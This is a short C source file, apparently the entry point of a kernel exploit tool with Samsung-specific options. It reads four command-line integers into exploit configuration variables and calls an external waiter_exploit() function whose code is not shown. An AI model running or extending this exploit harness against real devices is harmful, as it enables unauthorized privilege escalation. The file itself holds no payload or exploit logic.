#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include "log.h"

extern int waiter_exploit();
extern int config_new_samsung;
extern int config_iovstack;
extern int config_offset;
extern int config_force_remove;

void init_exploit() {
    LOGV("[+] <main> parent pid = %d", getpid());
    int retval = waiter_exploit();
    LOGV("Exploit result %d\n", retval);
}

int main(int argc, char **argv) {
    if (argc > 4) {
        config_new_samsung = atoi(argv[1]);
        config_iovstack = atoi(argv[2]);
        config_offset = atoi(argv[3]);
        config_force_remove = atoi(argv[4]);
    }

    init_exploit();
    return 0;
}